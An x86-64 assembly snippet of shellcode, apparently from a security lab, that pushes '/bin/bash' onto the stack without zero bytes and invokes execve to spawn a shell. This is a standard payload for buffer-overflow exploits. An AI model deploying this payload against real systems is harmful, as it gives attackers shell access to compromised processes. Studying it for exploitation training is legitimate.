section .text
  global _start
    _start:
      ; The following code calls execve("/bin/bash", ...)
      xor  rdx, rdx       ; 3rd argument
      push rdx
      mov  al,'h'
      push rax
      mov  rax,'/bin/bas'
      push rax
      mov  rdi, rsp        ; 1st argument
      push rdx
      push rdi
      mov  rsi, rsp        ; 2nd argument
      xor  rax, rax
      mov  al, 0x3b        ; execve()
      syscall
